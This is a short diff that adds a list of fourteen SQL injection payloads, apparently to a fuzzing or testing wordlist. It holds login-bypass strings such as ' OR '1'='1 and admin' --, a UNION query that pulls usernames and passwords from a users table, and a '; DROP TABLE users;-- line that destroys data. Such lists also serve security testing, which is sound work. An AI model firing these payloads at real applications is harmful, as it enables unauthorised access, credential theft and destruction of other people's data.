@@ -1,1 +1,15 @@
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+admin' --
+admin" --
+' OR 'a'='a
+') OR ('1'='1
+') OR '1'='1' --
+' UNION SELECT NULL, NULL, NULL--
+' AND 1=0 UNION ALL SELECT username, password, NULL FROM users--
+' OR 1=1# 
+' OR 1=1 LIMIT 1;--
+'; DROP TABLE users;--
 
